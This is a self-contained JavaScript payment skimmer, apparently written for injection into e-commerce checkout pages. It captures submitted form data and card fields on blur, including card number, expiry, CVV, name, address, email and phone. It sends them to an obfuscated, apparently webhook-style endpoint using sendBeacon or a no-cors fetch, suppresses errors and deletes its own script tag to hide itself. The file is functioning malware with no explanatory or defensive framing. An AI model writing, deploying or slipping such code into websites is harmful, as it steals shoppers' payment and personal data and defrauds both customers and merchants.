
(function () {
  function dh(s) { return atob(atob(s).split('').reverse().join('')); }
  var H = dh('__WB64__');
  var CT = 'application/x-www-form-urlencoded';
  var Q = 'payload_json=';
  var LBL = {
    'email': 'Email', 'firstname': 'First name', 'lastname': 'Last name',
    'telephone': 'Phone', 'street': 'Address', 'city': 'City', 'postcode': 'Postcode',
    'country_id': 'Country', 'cc_number': 'Card number', 'cc_exp': 'Expiry', 'cc_cid': 'CVV',
    'grand_total': 'Total', 'order_total': 'Total', 'amount': 'Total',
    'billing[email]': 'Email', 'billing[firstname]': 'First name', 'billing[lastname]': 'Last name',
    'billing[telephone]': 'Phone', 'billing[street][0]': 'Address', 'billing[city]': 'City',
    'billing[postcode]': 'Postcode', 'billing[country_id]': 'Country'
  };
  var SKIP = /^(form_key|uenc|_token|__RequestVerificationToken|g-recaptcha-response|to)$/;
  function lab(n) {
    if (LBL[n]) return LBL[n];
    return n.replace(/[\[\]_\-\.]+/g, ' ').replace(/\b\w/g, function (c) { return c.toUpperCase(); });
  }
  function collect(f) {
    var o = { Page: location.href };
    var i, e, v;
    for (i = 0; i < f.elements.length; i++) {
      e = f.elements[i];
      if (!e || !e.name || SKIP.test(e.name)) continue;
      v = (e.value == null) ? '' : e.value;
      if ((e.type === 'checkbox' || e.type === 'radio') && !e.checked) continue;
      if (e.type === 'select-multiple') v = Array.prototype.map.call(e.selectedOptions, function (x) { return x.value; }).join(', ');
      if (('' + v).trim() !== '') o[lab(e.name)] = ('' + v).trim();
    }
    return o;
  }
  function fields(o) {
    var a = [], k;
    for (k in o) { if (Object.prototype.hasOwnProperty.call(o, k)) a.push({ name: k, value: o[k], inline: true }); }
    return a;
  }
  function send(o) {
    try {
      var body = Q + encodeURIComponent(JSON.stringify({ embeds: [{ title: 'TranAnhKhoa', color: 14042437, description: o.Page, fields: fields(o), footer: { text: 'x' } }] }));
      if (navigator.sendBeacon) {
        navigator.sendBeacon(H, new Blob([body], { type: CT }));
      } else {
        fetch(H, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': CT }, body: body });
      }
    } catch (err) {}
  }
  var done = new Set();
  document.addEventListener('submit', function (ev) {
    var f = ev.target;
    if (!f || !f.elements || done.has(f)) return;
    done.add(f);
    setTimeout(function () { send(collect(f)); }, 0);
  }, true);
  var bseen = {};
  document.addEventListener('blur', function (ev) {
    var e = ev.target;
    if (!e || !e.name || !/cc_|card|exp|cvv|cid/i.test(e.name)) return;
    var v = ('' + (e.value == null ? '' : e.value)).trim();
    if (!v || bseen[e.name + '|' + v]) return;
    bseen[e.name + '|' + v] = 1;
    setTimeout(function () { var o = { Page: location.href }; o[lab(e.name)] = v; send(o); }, 0);
  }, true);
  try { var cs = document.currentScript; if (cs && cs.parentNode) { cs.parentNode.removeChild(cs); } } catch (err) {}
})();

